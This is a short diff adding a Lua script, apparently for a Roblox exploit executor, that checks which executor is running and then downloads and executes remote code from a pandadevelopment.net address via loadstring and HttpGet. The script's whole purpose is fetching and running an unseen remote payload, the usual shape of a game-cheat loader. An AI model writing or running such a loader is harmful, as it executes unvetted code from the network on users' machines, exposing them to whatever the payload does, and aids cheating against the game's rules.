@@ -1,0 +1,4 @@
+local d = identifyexecutor()
+print(d)
+loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/96ff353036da4acd"))()
+print("tufff")
